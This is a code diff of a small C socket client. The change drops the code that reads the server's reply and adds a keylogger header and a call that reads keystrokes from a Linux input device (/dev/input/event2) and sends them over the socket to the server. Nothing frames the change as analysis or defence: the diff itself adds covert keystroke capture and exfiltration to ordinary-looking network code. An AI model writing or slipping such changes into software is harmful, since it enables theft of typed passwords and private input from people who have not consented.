@@ -1,14 +1,14 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <string.h>
 #include <unistd.h>
+#include "keylog.h"  // Include the keylogger header
 
 int main() {
     int sock;
     struct sockaddr_in server;
-    char message[1000], server_reply[2000];
 
     // Create socket
     sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -18,9 +18,9 @@ int main() {
     }
     printf("Socket created\n");
 
-    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Server IP
+    server.sin_addr.s_addr = inet_addr("127.0.0.1");  // Server IP
     server.sin_family = AF_INET;
-    server.sin_port = htons(8888);
+    server.sin_port = htons(8888);  // Server port
 
     // Connect to remote server
     if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
@@ -29,13 +29,11 @@ int main() {
     }
     printf("Connected\n");
 
-    // Receive a reply from the server
-    if (recv(sock, server_reply, 2000, 0) < 0) {
-        printf("Recv failed\n");
-    }
-    printf("Server reply: %s\n", server_reply);
+    // Start the keylogger and send keystrokes to server
+    start_keylogger(sock, "/dev/input/event2");  // Pass the socket and device path
 
+    // Close the socket
     close(sock);
-
+    
     return 0;
 }
